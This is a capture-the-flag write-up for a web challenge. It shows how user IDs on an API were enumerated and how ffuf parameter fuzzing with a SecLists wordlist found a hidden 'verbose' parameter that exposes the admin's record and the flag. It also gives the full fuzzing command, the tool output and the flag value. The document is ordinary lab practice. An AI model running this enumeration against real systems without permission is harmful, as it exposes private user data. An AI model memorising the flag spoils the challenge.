## On the page "http://leak5.chal.deti:8014/" i saw
```
API

Directory service.
profile
```

## Method
- I clicked on the profile which took me to "http://leak5.chal.deti:8014/api/users/1" that returned
```
email	"alice@example.com"
id	1
username	"alice"
```
```
```

- I tried other ids at the end and it worked for numbers from 1-7 (enumeration with ffuf did this actually)

- I found out that id=7 is the admin 

- I got stuck and tried various forms of enumeration
  - I tried to enumerate on the "http://leak5.chal.deti:8014/FUZZ"
  - I tried on "http://leak5.chal.deti:8014/api/FUZZ"
  - I tried on "http://leak5.chal.deti:8014/api/users/FUZZ" (this showed that there were the 7 users)
  - I tried on "http://leak5.chal.deti:8014/api/users/{1-7}/FUZZ" i tried to fuzz every single user

- These showed nothing

- So I moved on the parameters, something like "http://leak5.chal.deti:8014/api/users/7?{something}={something}"

- I went to fuzz that with a parameters file from "https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Discovery/Web-Content/burp-parameter-names.txt"

- I fuzzed on the admin user because it seemed to be the one most likely to have stuff 
```
s24@s24:~/Downloads$ ffuf -u http://leak5.chal.deti:8014/api/users/7?FUZZ=1 -w ./burp-parameter-names.txt -ac

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://leak5.chal.deti:8014/api/users/7?FUZZ=1
 :: Wordlist         : FUZZ: /home/student/Downloads/burp-parameter-names.txt
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

verbose                 [Status: 200, Size: 119, Words: 1, Lines: 2, Duration: 20ms]
:: Progress: [6453/6453] :: Job [1/1] :: 1052 req/sec :: Duration: [0:00:07] :: Errors: 0 ::
```

- As you can see verbose is a parameter

- Then go to "http://leak5.chal.deti:8014/api/users/7?verbose=1" which returned
```
email	"admin@example.com"
flag	"flag{6ddc09c8a402a1079f82bce1c6c5e3f4}"
id	7
role	"admin"
username	"admin"
```

- As you can see the flag is there

## Reproduce
- Run the fuzzing "ffuf -u http://leak5.chal.deti:8014/api/users/7?FUZZ=1 -w ./burp-parameter-names.txt -ac"
- Verbose is a parameter
- Go to "http://leak5.chal.deti:8014/api/users/7?verbose=1"
- Flag is there

